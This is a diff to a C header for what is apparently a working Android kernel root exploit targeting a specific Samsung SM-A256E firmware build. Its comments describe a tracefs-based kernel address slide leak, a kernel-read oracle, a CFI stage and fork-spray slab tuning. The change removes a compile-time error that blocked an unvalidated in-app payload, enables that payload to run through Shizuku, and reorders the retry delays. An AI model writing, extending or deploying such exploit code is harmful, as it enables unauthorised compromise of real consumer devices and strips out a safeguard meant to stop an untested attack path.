@@ -2,14 +2,15 @@
 #define OFFSET_H
 
 /*
- * The A25 app-domain physical-P0 route needs an order-3 pipe/ASMEM kernel-read
- * fd established before the P0 slide oracle, which the socket-interleave
- * profile cannot provide.  Device-tested path is the standalone LD_PRELOAD
- * route (slide leak via tracefs) + KernelSU late-load.  Keep APP_PAYLOAD
- * gated until the app-domain route is validated, matching the ZE6 profile.
+ * SM-A256E app payload: uses the standalone tracefs slide route (slide.c)
+ * because the physical-P0 oracle needs a kernel-read fd that only exists after
+ * the CFI stage.  The app's Shizuku bridge runs the payload in the shell domain
+ * where tracefs is readable, so the app build is byte-for-byte the device-tested
+ * standalone chain.  Run the app with Shizuku mode enabled.
  */
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
-#error "SM-A256E A256EXXSADZA2 app payload is not validated; use the standalone build"
+#define BUILD_VARIANT_LABEL "a25x-A256EXXSADZA2-app-tracefs-root"
+#define DEFAULT_EXPLOIT_ATTEMPTS 1
 #else
 #define BUILD_VARIANT_LABEL "a25x-A256EXXSADZA2-root-umh-pi-safe"
 #endif
@@ -60,7 +61,7 @@
 #define FOPS_PSELECT_SYNC_TIMEOUT_USEC 20000
 #define FOPS_PSELECT_SYNC_CONFIRMATIONS 3
 #define APP_PAYLOAD_ATTEMPT_DELAYS_USEC \
-  10000, 20000, 30000, 40000, 50000, 60000, 70000, 80000
+  20000, 30000, 40000, 50000, 60000, 70000, 80000, 10000
 /* Cap fork spray — full 32 slabs * 72 tries OOMs A25. */
 #define MM_PREPARE_SLABS 12
 #define FOPS_SKB_RECLAIM_SENDS 192
